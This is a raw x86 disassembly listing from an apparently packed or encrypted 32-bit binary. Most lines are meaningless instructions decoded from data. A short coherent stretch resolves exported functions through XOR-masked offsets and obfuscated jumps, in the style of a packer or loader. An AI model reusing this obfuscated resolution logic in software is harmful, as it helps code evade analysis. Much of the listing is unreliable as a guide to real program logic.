  407375:	xchg   ebp,eax
  407376:	adc    DWORD PTR [edx+eax*8],eax
  407379:	sbb    BYTE PTR [ecx-0x119e87d8],bh
  40737f:	cmp    edi,DWORD PTR [edi+edi*1]
  407382:	inc    ebp
  407383:	pusha  
  407384:	sub    DWORD PTR fs:[esi+0x27],0x28e312
  40738c:	lock cmp edi,esi
  40738f:	dec    edi
  407390:	pop    ecx
  407391:	shl    BYTE PTR [edi+0x1d],0xa3
  407395:	into   
  407396:	push   0xe70f4f52
  40739b:	inc    ebx
  40739c:	and    eax,0x976e9dc6
  4073a1:	sbb    ch,cl
  4073a3:	shl    BYTE PTR [edi],0x5
  4073a6:	adc    cl,BYTE PTR [ecx]
  4073a8:	sub    ebp,ebp
  4073aa:	cmp    eax,0x76b46b09
  4073af:	add    eax,0x6da5ed1d
  4073b4:	test   eax,0x251fbe42
  4073b9:	pop    ds
  4073ba:	or     dl,BYTE PTR [ebx+0x23e2aef7]
  4073c0:	jne    0x407437
  4073c2:	repz push cs
  4073c4:	and    dl,0xd9
  4073c7:	dec    esi
  4073c8:	dec    eax
  4073c9:	out    0xa4,eax
  4073cb:	sbb    DWORD PTR [ecx+0x53],ecx
  4073ce:	popa   
  4073cf:	neg    BYTE PTR [esp+edx*8+0x18]
  4073d3:	mov    al,ds:0x367de187
  4073d8:	or     esi,esp
  4073da:	pop    ds
  4073db:	push   esp
  4073dc:	inc    ebp
  4073dd:	stc    
  4073de:	xchg   ebx,eax
  4073df:	pop    ecx
  4073e0:	imul   edx,DWORD PTR [ecx+0x0],0xffffffdf
  4073e4:	and    bh,BYTE PTR [edi-0x1e24f661]
  4073ea:	cld    
  4073eb:	int3   
  4073ec:	inc    ebx
  4073ed:	jecxz  0x40743a
  4073ef:	dec    eax
  4073f0:	push   ebp
  4073f1:	xchg   esp,eax
  4073f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073f4:	adc    eax,0xf7d65bd
  4073f9:	mov    DWORD PTR [ebx+esi*8-0x53dd4c98],esp
  407400:	lods   eax,DWORD PTR ds:[esi]
  407401:	cmp    DWORD PTR ds:0x9db0f468,0xffffff86
  407408:	nop
  407409:	or     ch,ch
  40740b:	or     eax,0x83842979
  407410:	loopne 0x4073ce
  407412:	ror    BYTE PTR [esi],cl
  407414:	ins    DWORD PTR es:[edi],dx
  407415:	sahf   
  407416:	loopne 0x40740f
  407418:	mov    ecx,0xf9a72f17
  40741d:	add    DWORD PTR [edi+0x6df9df9c],ecx
  407423:	adc    BYTE PTR [edx],dl
  407425:	jmp    0xd3ad:0xb89e023c
  40742c:	add    eax,0x5e81a571
  407431:	stos   DWORD PTR es:[edi],eax
  407432:	add    eax,0x717ca074
  407437:	int3   
  407438:	mov    gs:0x27aa6c98,al
  40743e:	or     al,0x2
  407440:	outs   dx,BYTE PTR ds:[esi]
  407441:	jl     0x4073ff
  407443:	pop    esi
  407444:	pushf  
  407445:	(bad)  
  407446:	leave  
  407447:	sbb    DWORD PTR [ebp+0x6e],esp
  40744a:	out    dx,al
  40744b:	mov    edx,0x21e82e34
  407450:	retf   
  407451:	stc    
  407452:	aad    0xc1
  407454:	inc    ecx
  407455:	addr16 sub ah,dh
  407458:	rcl    DWORD PTR [eax+0x30149de9],cl
  40745e:	aad    0x3e
  407460:	push   cs
  407461:	outs   dx,BYTE PTR ds:[esi]
  407462:	dec    ebp
  407463:	sbb    DWORD PTR [edi+0x589275c9],eax
  407469:	mov    ebp,0x489db4be
  40746e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40746f:	clc    
  407470:	add    dl,BYTE PTR [esi]
  407472:	imul   eax,DWORD PTR [esi-0xc],0xa1eb59bb
  407479:	sar    BYTE PTR [ebx+ecx*2-0x72a965f9],1
  407480:	(bad)  
  407481:	outs   dx,DWORD PTR ds:[esi]
  407482:	pop    ecx
  407483:	pusha  
  407484:	push   0x79ec5ad0
  407489:	dec    ecx
  40748a:	xchg   ecx,eax
  40748b:	bswap  eax
  40748d:	into   
  40748e:	xor    cl,bh
  407490:	adc    dl,al
  407492:	xor    esp,0x820ee6c4
  407498:	xchg   esp,eax
  407499:	iret   
  40749a:	retf   
  40749b:	out    dx,eax
  40749c:	xchg   edx,eax
  40749d:	mov    al,0x5b
  40749f:	sti    
  4074a0:	sbb    edx,DWORD PTR [edx+edi*2-0x37d06981]
  4074a7:	jae    0x407451
  4074a9:	mov    ch,0x4d
  4074ab:	xor    eax,0xf2609038
  4074b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074b1:	dec    edx
  4074b2:	or     al,BYTE PTR [ebx-0x21fc80f4]
  4074b8:	or     ecx,edx
  4074ba:	enter  0xd9d4,0x88
  4074be:	je     0x4074ff
  4074c0:	jae    0x40745f
  4074c2:	shl    BYTE PTR [ebx-0x7c],cl
  4074c5:	leave  
  4074c6:	mov    esp,0xaf834a25
  4074cb:	pop    esi
  4074cc:	out    dx,al
  4074cd:	ss jns 0x407490
  4074d0:	(bad)  
  4074d1:	adc    DWORD PTR [ebx],ebx
  4074d3:	xchg   DWORD PTR [esi-0xe],ebp
  4074d6:	inc    ebx
  4074d7:	icebp  
  4074d8:	sbb    eax,0x6ef9f839
  4074dd:	xchg   bl,al
  4074df:	xor    ecx,esi
  4074e1:	not    BYTE PTR [ecx+ecx*1]
  4074e4:	fnstcw WORD PTR [ebx-0x7c714b34]
  4074ea:	clc    
  4074eb:	xchg   edi,eax
  4074ec:	inc    ecx
  4074ed:	push   esp
  4074ee:	test   BYTE PTR [eax-0x21],ch
  4074f1:	jg     0x4074ab
  4074f3:	lods   al,BYTE PTR ds:[esi]
  4074f4:	jle    0x4074ba
  4074f6:	cli    
  4074f7:	jg     0x407506
  4074f9:	sahf   
  4074fa:	xchg   edi,eax
  4074fb:	and    al,0x73
  4074fd:	iret   
  4074fe:	mov    cr5,edi
  407501:	or     bl,BYTE PTR [ebp+0x476f1bdf]
  407507:	sti    
  407508:	loopne 0x407513
  40750a:	dec    ebp
  40750b:	jb     0x407497
  40750d:	and    BYTE PTR [ebx],ch
  40750f:	(bad)  
  407510:	iret   
  407511:	iret   
  407512:	pop    esi
  407513:	fimul  WORD PTR [ebp-0x2d]
  407516:	sub    edx,DWORD PTR [edx]
  407518:	or     ecx,DWORD PTR [esi+0x61b76ced]
  40751e:	(bad)  
  40751f:	xchg   edx,eax
  407520:	jno    0x407521
  407522:	sbb    bl,BYTE PTR [ebx+0x6c]
  407525:	fldcw  WORD PTR ds:[edx+ebp*1+0x7d]
  40752a:	lock dec eax
  40752c:	sbb    eax,0xa7c71e4d
  407531:	dec    eax
  407532:	movaps xmm3,XMMWORD PTR [edi-0x5a]
  407536:	clc    
  407537:	test   DWORD PTR [edx+0x46],0x8fd1b4ca
  40753e:	daa    
  40753f:	fstp   DWORD PTR [edx]
  407541:	sub    dl,BYTE PTR [edx-0x45563ffb]
  407547:	test   DWORD PTR [ecx-0x68],ebx
  40754a:	std    
  40754b:	or     ebp,ecx
  40754d:	stc    
  40754e:	aad    0x88
  407550:	xlat   BYTE PTR ds:[ebx]
  407551:	or     esp,DWORD PTR [esi+0x17]
  407554:	sub    eax,DWORD PTR [edi+0x4d]
  407557:	out    0xd1,al
  407559:	das    
  40755a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40755b:	retf   
  40755c:	cdq    
  40755d:	adc    cl,al
  40755f:	mov    ds:0xd493cf1b,eax
  407564:	data16 fsubr st(0),st
  407567:	rcr    BYTE PTR [esp+ecx*1],1
  40756a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40756b:	shr    DWORD PTR [edi+edi*2],1
  40756e:	stos   BYTE PTR es:[edi],al
  40756f:	and    bh,BYTE PTR [eax+0x4b97ebc6]
  407575:	jle    0x407508
  407577:	lock sbb al,0x26
  40757a:	mov    ebp,0x60755c2f
  40757f:	scas   eax,DWORD PTR es:[edi]
  407580:	pop    edi
  407581:	cli    
  407582:	xchg   edx,eax
  407583:	retf   
  407584:	dec    edx
  407585:	mov    ds:0xd9e99567,al
  40758a:	les    esi,FWORD PTR [edi]
  40758c:	add    ch,dh
  40758e:	push   edx
  40758f:	rcl    DWORD PTR ds:0xc7b750d5,cl
  407595:	push   ebx
  407596:	add    al,0x4b
  407598:	(bad)
  40759c:	mov    ebp,esi
  40759e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40759f:	push   ds
  4075a0:	in     eax,0xe1
  4075a2:	subps  xmm6,XMMWORD PTR [ebx-0x5c058859]
  4075a9:	ins    DWORD PTR es:[edi],dx
  4075aa:	dec    edi
  4075ab:	xor    BYTE PTR [eax],ah
  4075ad:	jae    0x40759e
  4075af:	fisubr WORD PTR [edi+eiz*8]
  4075b2:	cmpunordss xmm2,xmm7
  4075b7:	jbe    0x407610
  4075b9:	sbb    eax,0xb884ede2
  4075be:	mov    al,0x31
  4075c0:	jb     0x407622
  4075c2:	or     BYTE PTR [edi+0x15744982],bl
  4075c8:	in     eax,dx
  4075c9:	jne    0x407645
  4075cb:	or     DWORD PTR [edi+esi*2-0x3],ecx
  4075cf:	xchg   esi,eax
  4075d0:	sbb    DWORD PTR [edx],0xffffffbc
  4075d3:	ficomp DWORD PTR [ecx]
  4075d5:	scas   eax,DWORD PTR es:[edi]
  4075d6:	pop    ebp
  4075d7:	mov    ah,0xec
  4075d9:	dec    edi
  4075da:	mov    esi,0x396c036
  4075df:	inc    eax
  4075e0:	or     edx,ebx
  4075e2:	sbb    BYTE PTR [ecx],ah
  4075e4:	mov    ebx,ss
  4075e6:	xor    al,0x5f
  4075e8:	sub    dl,dl
  4075ea:	pushf  
  4075eb:	inc    ebp
  4075ec:	repz add ebp,edi
  4075ef:	ret    
  4075f0:	aas    
  4075f1:	cmp    esp,DWORD PTR [edx]
  4075f3:	jmp    FWORD PTR [edx+ebp*2]
  4075f6:	out    0x75,al
  4075f8:	dec    edi
  4075f9:	jg     0x4075d4
  4075fb:	ficom  WORD PTR [ecx+0x66203726]
  407601:	rol    DWORD PTR [ecx],0x89
  407604:	popa   
  407605:	bound  ebp,QWORD PTR [eax]
  407607:	test   BYTE PTR [esi+0x2b],bl
  40760a:	add    al,0xee
  40760c:	(bad)  
  40760d:	int3   
  40760e:	xchg   esp,eax
  40760f:	inc    esi
  407610:	cmp    al,0xc5
  407612:	into   
  407613:	jno    0x4075f4
  407615:	mov    dl,0xb2
  407617:	jecxz  0x4075e4
  407619:	cs rol dh,1
  40761c:	repnz mul DWORD PTR [ebx-0x3cc828ff]
  407623:	adc    dh,BYTE PTR [esi+0x30]
  407626:	jo     0x407645
  407628:	out    dx,al
  407629:	mov    DWORD PTR [eax+0x3f03b99c],edi
  40762f:	jmp    0xe8ae220e
  407634:	ja     0x4075ce
  407636:	sar    DWORD PTR [ecx+0x789f3900],1
  40763c:	jp     0x407610
  40763e:	pop    eax
  40763f:	fwait
  407640:	(bad)  
  407642:	mov    ebx,0xa6c3c743
  407647:	(bad)  
  407648:	jmp    0x78d20f28
  40764d:	pop    es
  40764e:	(bad)  
  40764f:	mov    ebp,0xf9dec6df
  407654:	pop    ds
  407655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407656:	loop   0x4075fb
  407658:	call   DWORD PTR [esi+0x4b0f6cb5]
  40765e:	retf   0x50b9
  407661:	stos   DWORD PTR es:[edi],eax
  407662:	cmp    al,0x61
  407664:	and    esp,DWORD PTR [edx]
  407666:	mov    al,ds:0x78d613b5
  40766b:	lahf   
  40766c:	imul   esi,DWORD PTR [ebp+0x26],0xa39b3577
  407673:	fsub   DWORD PTR [edi+0xd8f4ec8]
  407679:	xchg   DWORD PTR es:[ecx],ebp
  40767c:	pop    ss
  40767d:	int3   
  40767e:	fidiv  WORD PTR [ebx+0x25]
  407681:	cmp    dh,BYTE PTR [ebx+0x4959b75a]
  407687:	xchg   esp,eax
  407688:	inc    ebx
  407689:	add    DWORD PTR [edx+0xeec4d57],ebp
  40768f:	cmp    al,0x4a
  407691:	xchg   DWORD PTR [esi+0x78],esi
  407694:	inc    ebx
  407695:	out    0x32,eax
  407697:	imul   eax,DWORD PTR gs:[edx-0x80],0xfcef2e1f
  40769f:	and    bl,BYTE PTR [edi+0x512051f8]
  4076a5:	je     0x40766a
  4076a7:	stos   DWORD PTR es:[edi],eax
  4076a8:	dec    ebp
  4076a9:	and    edx,0x61
  4076ac:	aam    0x25
  4076ae:	jns    0x407722
  4076b0:	mov    ds:0x2c4f11cf,eax
  4076b5:	push   eax
  4076b6:	clc    
  4076b7:	pop    eax
  4076b8:	retf   0x9778
  4076bb:	push   ds
  4076bc:	adc    DWORD PTR [ecx-0x481eafb2],eax
  4076c2:	gs cli 
  4076c4:	sub    ah,cl
  4076c6:	push   0x38016c1f
  4076cb:	pop    ds
  4076cc:	lock rol DWORD PTR [edi+0x210d125e],cl
  4076d3:	xchg   ecx,eax
  4076d4:	ja     0x4076ce
  4076d6:	pop    ebx
  4076d7:	out    dx,eax
  4076d8:	loope  0x4076cd
  4076da:	push   esp
  4076db:	(bad)  [eax-0x6b]
  4076de:	mov    ah,0x34
  4076e0:	div    BYTE PTR [ecx]
  4076e2:	mov    ecx,0x397a7192
  4076e7:	sbb    ebx,edi
  4076e9:	(bad)  [ebp-0x5fbc60ce]
  4076ef:	clc    
  4076f0:	mov    eax,ds:0xfb26a0d4
  4076f5:	mov    ecx,0x749c3cc8
  4076fa:	aad    0xd
  4076fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076fd:	imul   ebp,edi,0xf2729873
  407703:	sub    esp,DWORD PTR [edx+0x2e]
  407706:	jmp    0x2f8da95e
  40770b:	mov    BYTE PTR [edx],0x4d
  40770e:	xor    BYTE PTR [eax+0x60],dl
  407711:	fmul   DWORD PTR [esi]
  407713:	imul   eax,DWORD PTR [ecx-0x5d06c05c],0xeaed9357
  40771d:	ss dec esi
  40771f:	xor    BYTE PTR [edi],dl
  407721:	dec    ecx
  407722:	adc    eax,0x70755294
  407727:	jmp    0x25b61337
  40772c:	adc    esp,ebp
  40772e:	push   ds
  40772f:	push   ecx
  407730:	scas   al,BYTE PTR es:[edi]
  407731:	icebp  
  407732:	push   es
  407733:	ins    BYTE PTR es:[edi],dx
  407734:	loope  0x407717
  407736:	add    eax,0xb42f5061
  40773b:	aaa    
  40773c:	cdq    
  40773d:	cmp    eax,0x7ceb3205
  407742:	cmc    
  407743:	rcl    DWORD PTR [eax+esi*8+0x3fcdeaf8],1
  40774a:	cmp    eax,0x31de0625
  40774f:	sbb    dl,dh
  407751:	fild   QWORD PTR [ebp-0x64]
  407754:	cmp    DWORD PTR [ebx-0x4ef10ebf],0x15
  40775b:	nop
  40775c:	cmp    al,0x13
  40775e:	mov    dh,0xfe
  407760:	mov    dh,0x5b
  407762:	or     DWORD PTR [ebp+0xd346ef],eax
  407768:	jne    0x407703
  40776a:	ret    0xf106
  40776d:	(bad)  
  40776e:	js     0x40778c
  407770:	sbb    ch,bh
  407772:	cdq    
  407773:	jg     0x407769
  407775:	dec    esp
  407776:	(bad)  
  407777:	or     eax,0x9733c9e5
  40777c:	jb     0x4077f3
  40777e:	sbb    al,BYTE PTR [edi+0x4cc700e]
  407784:	cmp    eax,0xd67b231f
  407789:	mov    eax,0xc70b4345
  40778e:	and    dh,BYTE PTR [edi-0x5450bab2]
  407794:	push   esp
  407795:	lods   al,BYTE PTR ds:[esi]
  407796:	loop   0x407805
  407798:	nop
  407799:	sub    DWORD PTR [ebx-0x143fe4ac],ebx
  40779f:	sbb    ecx,DWORD PTR [ecx+0x49]
  4077a2:	jge    0x40781d
  4077a4:	stc    
  4077a5:	in     al,0xb7
  4077a7:	inc    eax
  4077a8:	mov    ecx,0x7f31d9dc
  4077ad:	in     al,0x60
  4077af:	pop    edx
  4077b0:	inc    edx
  4077b1:	mov    cl,0xfc
  4077b3:	cmp    DWORD PTR [esi],eax
  4077b5:	gs add eax,0x43c97c94
  4077bb:	mov    esp,0x4ba8f088
  4077c0:	jp     0x40776a
  4077c2:	lock sahf 
  4077c4:	shl    BYTE PTR [ebx+0x72],1
  4077c7:	retf   
  4077c8:	inc    esp
  4077c9:	sahf   
  4077ca:	test   DWORD PTR [eax+edi*2-0x331012a7],0xb5411b0c
  4077d5:	push   ds
  4077d6:	xchg   esi,eax
  4077d7:	rol    esp,cl
  4077d9:	in     eax,0xea
  4077db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077dc:	xor    dl,BYTE PTR [edi+0x62]
  4077df:	inc    edi
  4077e0:	aam    0xd9
  4077e2:	pop    ds
  4077e3:	xchg   edi,eax
  4077e4:	xlat   BYTE PTR ds:[ebx]
  4077e5:	push   ebp
  4077e6:	xchg   esp,eax
  4077e7:	cmp    DWORD PTR [ecx-0x64],ebx
  4077ea:	mov    ebp,0x17f60770
  4077ef:	xor    DWORD PTR [edi],esp
  4077f1:	add    BYTE PTR [eax+eax*8-0x44],ah
  4077f5:	xchg   esp,eax
  4077f6:	fwait
  4077f7:	ins    DWORD PTR es:[edi],dx
  4077f8:	imul   eax,esi,0x30
  4077fb:	test   DWORD PTR [edx+0x159c86c5],eax
  407801:	loopne 0x407802
  407803:	gs mov dh,0x15
  407806:	push   edx
  407807:	pusha  
  407808:	dec    ebp
  407809:	pop    edi
  40780a:	pop    ebp
  40780b:	imul   esp,ecx,0xfffffff8
  40780e:	or     al,BYTE PTR [ecx]
  407810:	mov    WORD PTR [ebp-0x638d6c0d],gs
  407816:	rol    DWORD PTR [eax-0x3c],1
  407819:	lods   eax,DWORD PTR ds:[esi]
  40781a:	(bad)  
  40781b:	paddsw mm7,mm7
  40781e:	inc    esi
  407820:	and    BYTE PTR [eax],ah
  407822:	xor    ecx,DWORD PTR [ebx+edi*1+0x76]
  407826:	pop    esi
  407827:	shl    BYTE PTR [ecx],cl
  407829:	cmp    bh,BYTE PTR [esi-0x2f]
  40782c:	imul   ebx,DWORD PTR [edx],0xdb6c29bb
  407832:	xchg   ebp,eax
  407833:	dec    esi
  407834:	sub    ah,BYTE PTR [edi-0x65]
  407837:	push   eax
  407838:	fisttp DWORD PTR [ebx-0x6722550]
  40783e:	inc    ebp
  40783f:	call   0x1f19:0x64502222
  407846:	jne    0x407890
  407848:	icebp  
  407849:	hlt    
  40784a:	push   esi
  40784b:	ret    0x2b44
  40784e:	ja     0x4077e2
  407850:	adc    ah,BYTE PTR [ecx]
  407852:	mov    esp,0x5cac7fc9
  407857:	jno    0x40787f
  407859:	adc    BYTE PTR [eax],ch
  40785b:	lods   al,BYTE PTR ds:[esi]
  40785c:	ja     0x4077e5
  40785e:	fsubr  DWORD PTR [ebx+0x169c556c]
  407864:	ins    DWORD PTR es:[edi],dx
  407865:	adc    al,0x65
  407867:	imul   ebx,DWORD PTR [ebx-0x6e88cc85],0x6e604ec3
  407871:	std    
  407872:	cld    
  407873:	adc    eax,0x21422390
  407878:	in     eax,dx
  407879:	fsubr  DWORD PTR [ecx+0x53]
  40787c:	sbb    ecx,DWORD PTR [edx+0x2b69e51c]
  407882:	ds add al,0x8e
  407885:	clc    
  407886:	cvtps2pi mm7,QWORD PTR [eax]
  407889:	adc    BYTE PTR [edi+0x7d],ch
  40788c:	jo     0x407905
  40788e:	or     DWORD PTR [eax],edi
  407890:	dec    ebx
  407891:	xchg   BYTE PTR [eax],bl
  407893:	jbe    0x7e132747
  407899:	into   
  40789a:	mov    bh,0x66
  40789c:	inc    ebx
  40789d:	fwait
  40789e:	test   al,0xf2
  4078a0:	mov    esp,0x7450a759
  4078a5:	cmp    edi,DWORD PTR [eax-0x1a8cdfff]
  4078ab:	scas   eax,DWORD PTR es:[edi]
  4078ac:	bsr    ebx,DWORD PTR ds:0x37a199ad
  4078b3:	stos   DWORD PTR es:[edi],eax
  4078b4:	pxor   mm6,mm3
  4078b7:	sub    BYTE PTR [ebx],dh
  4078b9:	jbe    0x40791d
  4078bb:	data16 add al,0xe7
  4078be:	mov    bl,0x7
  4078c0:	(bad)  
  4078c1:	clc    
  4078c2:	jo     0x4078e1
  4078c4:	push   edi
  4078c5:	mov    ch,BYTE PTR [eax-0x1aa84659]
  4078cb:	inc    ebx
  4078cc:	popa   
  4078cd:	sub    eax,0x13200790
  4078d2:	lahf   
  4078d3:	test   ch,ch
  4078d5:	sub    esp,DWORD PTR [esi+0x3a]
  4078d8:	fdivr  DWORD PTR [eax]
  4078da:	hlt    
  4078db:	dec    edi
  4078dc:	mov    ecx,0x3fe95c44
  4078e1:	xchg   esi,eax
  4078e2:	jbe    0x40791a
  4078e4:	clc    
  4078e5:	pop    esp
  4078e6:	xchg   ebx,eax
  4078e7:	and    BYTE PTR [edi+esi*8-0x6c9dd816],cl
  4078ee:	stos   DWORD PTR es:[edi],eax
  4078ef:	or     edi,DWORD PTR es:[eax]
  4078f2:	jecxz  0x40790d
  4078f4:	cmc    
  4078f5:	pop    es
  4078f6:	pusha  
  4078f7:	ins    DWORD PTR es:[edi],dx
  4078f8:	test   eax,0xa4804bc9
  4078fd:	(bad)  
  4078fe:	xor    eax,0x690bde59
  407903:	xchg   ecx,eax
  407904:	dec    edi
  407905:	(bad)  
  407906:	and    al,0x9c
  407908:	out    dx,eax
  407909:	mul    BYTE PTR [eax]
  40790b:	jns    0x407898
  40790d:	stc    
  40790e:	adc    edx,esp
  407910:	mov    esp,0xd794b025
  407915:	in     eax,0x39
  407917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407918:	add    ecx,esp
  40791a:	xchg   DWORD PTR [ecx],ebx
  40791c:	sbb    ch,BYTE PTR [edi+0x5e7637fd]
  407922:	mov    ebp,0x267c011b
  407927:	inc    ebx
  407928:	and    bl,0x2f
  40792b:	inc    edx
  40792c:	dec    edx
  40792d:	cmp    eax,0x6c0f2029
  407932:	cmp    dh,BYTE PTR [edi-0x60fe8937]
  407938:	or     cl,bh
  40793a:	scas   eax,DWORD PTR es:[edi]
  40793b:	(bad)  
  40793c:	mov    cl,0xc4
  40793e:	xchg   esi,eax
  40793f:	inc    ebx
  407940:	push   ebx
  407941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407942:	cmp    BYTE PTR [ebp-0x79],bl
  407945:	js     0x4078e6
  407947:	add    DWORD PTR [edx-0x51],ebx
  40794a:	mov    bl,0x9e
  40794c:	add    esp,esp
  40794e:	push   edx
  40794f:	out    0xbd,al
  407951:	xor    eax,DWORD PTR [esi-0x64]
  407954:	pop    edx
  407955:	xor    BYTE PTR [ebx+0x65305ebb],bh
  40795b:	ret    0x5b15
  40795e:	sbb    eax,0xbb3ec3cb
  407963:	shl    BYTE PTR ds:0xef51f14d,1
  407969:	cmp    al,0x92
  40796b:	fcomp  st(0)
  40796d:	pop    edi
  40796e:	hlt    
  40796f:	(bad)  
  407970:	cli    
  407971:	scas   al,BYTE PTR es:[edi]
  407972:	repnz adc eax,edi
  407975:	(bad)  
  407976:	sbb    eax,DWORD PTR [ebx-0x26]
  407979:	inc    edx
  40797a:	mov    dh,0x60
  40797c:	fdiv   DWORD PTR [eax]
  40797e:	push   0x84b77673
  407983:	loope  0x407954
  407985:	jb     0x40796d
  407987:	inc    edx
  407988:	push   cs
  407989:	ins    DWORD PTR es:[edi],dx
  40798a:	sub    eax,0x808fad5a
  40798f:	(bad)  
  407990:	rcr    DWORD PTR [edx+0x360e027a],1
  407996:	mov    ebp,0xd7ae687f
  40799b:	and    BYTE PTR [edx],cl
  40799d:	adc    al,0xfd
  40799f:	xchg   BYTE PTR [ebp+ebx*2+0x52bf53c3],bl
  4079a6:	jno    0x407a16
  4079a8:	dec    eax
  4079a9:	std    
  4079aa:	(bad)  
  4079ab:	fs and eax,0x92673215
  4079b1:	jnp    0x4079dc
  4079b3:	arpl   bx,di
  4079b5:	mov    bh,0x4
  4079b7:	sbb    al,0xf2
  4079b9:	adc    BYTE PTR [ebp+0x47],bl
  4079bc:	into   
  4079bd:	jmp    0x407998
  4079bf:	add    ebp,DWORD PTR [ebx+0x64]
  4079c2:	dec    edx
  4079c3:	fisttp WORD PTR [edi+eiz*2-0x69f0d91a]
  4079ca:	add    ecx,DWORD PTR [edi+edx*1]
  4079cd:	leave  
  4079ce:	rcl    cl,1
  4079d0:	jbe    0x4079f4
  4079d2:	inc    ebp
  4079d3:	sbb    DWORD PTR [eax-0x41],ecx
  4079d6:	outs   dx,DWORD PTR ds:[esi]
  4079d7:	xor    ebp,DWORD PTR [edx]
  4079d9:	loope  0x407a0c
  4079db:	mov    WORD PTR [edi-0x5b85bab8],fs
  4079e1:	arpl   WORD PTR [ebx-0x3b],cx
  4079e4:	pop    es
  4079e5:	int3   
  4079e6:	loope  0x4079b4
  4079e8:	push   ebx
  4079e9:	imul   ebp,DWORD PTR [ebx+0x1dd9713d],0x5c
  4079f0:	pop    ebx
  4079f1:	push   edx
  4079f2:	xlat   BYTE PTR ds:[ebx]
  4079f3:	mov    al,0x26
  4079f5:	sbb    eax,0xd87c1752
  4079fa:	or     ebx,DWORD PTR [edx+0x3a9c05a4]
  407a00:	sbb    al,0x76
  407a02:	cmp    edx,DWORD PTR [esp+esi*2-0x61]
  407a06:	out    dx,eax
  407a07:	call   0x8f1a:0xd176a037
  407a0e:	adc    DWORD PTR [edi+0x76],eax
  407a11:	lods   al,BYTE PTR ds:[esi]
  407a12:	push   ebp
  407a13:	mov    eax,ds:0x2ab7e877
  407a18:	aad    0xcf
  407a1a:	mov    BYTE PTR [edi],dl
  407a1c:	jg     0x407a6a
  407a1e:	mov    ebp,0x962cf59d
  407a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a24:	mov    edx,0x206f3ff1
  407a29:	mov    edx,0x37834b6b
  407a2e:	xchg   BYTE PTR [esi],dl
  407a30:	or     eax,0x786d3a12
  407a35:	iret   
  407a36:	test   BYTE PTR [edi-0x7fe90a6e],bh
  407a3c:	jnp    0x407a39
  407a3e:	aas    
  407a3f:	mov    eax,ds:0x228ba1fe
  407a44:	ret    0x4d8b
  407a47:	cld    
  407a48:	mov    edx,DWORD PTR [ebp-0x30]
  407a4b:	xor    ecx,ebx
  407a4d:	add    ecx,eax
  407a4f:	cmp    edx,ecx
  407a51:	je     0x407abe
  407a57:	lea    eax,[ebp-0x8]
  407a5a:	push   eax
  407a5b:	push   DWORD PTR [ebp-0x28]
  407a5e:	push   DWORD PTR [ebp+0xc]
  407a61:	call   0x40f238
  407a66:	mov    eax,0x3272dd
  407a6b:	mov    ecx,DWORD PTR [ebp-0x4]
  407a6e:	mov    edx,DWORD PTR [ebp-0x8]
  407a71:	xor    ecx,ebx
  407a73:	add    ecx,eax
  407a75:	cmp    edx,ecx
  407a77:	je     0x407a92
  407a7d:	mov    ecx,DWORD PTR [ebp-0x34]
  407a80:	movzx  ecx,WORD PTR [ecx+esi*2]
  407a84:	mov    edx,DWORD PTR [ebp-0x18]
  407a87:	mov    ecx,DWORD PTR [edx+ecx*4]
  407a8a:	mov    DWORD PTR [ebp-0x38],ecx
  407a8d:	jmp    0x4056db
  407a92:	mov    ecx,DWORD PTR [ebp-0x14]
  407a95:	xor    ecx,ebx
  407a97:	lea    esi,[esi+ecx*1+0x3272dd]
  407a9e:	jmp    0x40540c
  407aa3:	mov    eax,DWORD PTR [ebp-0x4]
  407aa6:	xor    eax,ebx
  407aa8:	add    eax,edi
  407aaa:	jmp    0x409f7a
  407aaf:	mov    eax,DWORD PTR [ebp-0x4]
  407ab2:	xor    eax,ebx
  407ab4:	add    eax,0x3272dd
  407ab9:	jmp    0x409f7a
  407abe:	mov    ecx,DWORD PTR [ebp-0x38]
  407ac1:	add    ecx,DWORD PTR [ebp+0x8]
  407ac4:	mov    DWORD PTR [ebp-0x10],ecx
  407ac7:	mov    ecx,DWORD PTR [ebp-0x1c]
  407aca:	test   ecx,ecx
  407acc:	je     0x409f05
  407ad2:	mov    DWORD PTR [ebp-0x20],0x0
  407ad9:	push   0x3
  407adb:	xor    edx,edx
  407add:	pop    edx
  407ade:	add    edx,0x8
  407ae1:	push   edx
  407ae2:	pop    ecx
  407ae3:	push   0x6
  407ae5:	dec    ecx
  407ae6:	pop    ebx
  407ae7:	dec    ebx
  407ae8:	xchg   ebx,ecx
  407aea:	sub    ebx,ecx
  407aec:	xchg   ebx,ecx
  407aee:	dec    ecx
  407aef:	mov    eax,DWORD PTR [ebp-0x1c]
  407af2:	imul   eax,ecx
  407af5:	sub    esp,eax
  407af7:	mov    DWORD PTR [ebp-0x20],esp
  407afa:	mov    eax,DWORD PTR [ebp-0x4]
  407afd:	mov    ecx,0x7510896
  407b02:	xor    eax,ecx
  407b04:	mov    edx,0x3272dd
  407b09:	add    eax,edx
  407b0b:	mov    DWORD PTR [ebp+0x8],eax
  407b0e:	mov    eax,DWORD PTR [ebp-0x14]
  407b11:	xor    eax,ecx
  407b13:	add    eax,edx
  407b15:	mov    edx,DWORD PTR [ebp+0x14]
  407b18:	jmp    0x409e70
  407b1d:	push   es
  407b1e:	or     DWORD PTR [esi],ebx
  407b20:	xchg   DWORD PTR [ecx],eax
  407b22:	xchg   DWORD PTR [ebx+0x7caff18b],ecx
  407b28:	xor    eax,0x1f232005
  407b2d:	nop
  407b2e:	and    BYTE PTR [edx+0x7a],bh
  407b31:	aaa    
  407b32:	pop    edi
  407b33:	jp     0x407baf
  407b35:	rdmsr  
  407b37:	adc    DWORD PTR [ecx],0xffffff9c
  407b3a:	pop    esp
  407b3b:	aaa    
  407b3c:	cli    
  407b3d:	pop    es
  407b3e:	inc    ebx
  407b3f:	sbb    al,0xb8
  407b41:	sub    eax,0xc85156a9
  407b46:	cmp    al,0xc2
  407b48:	jl     0x407b35
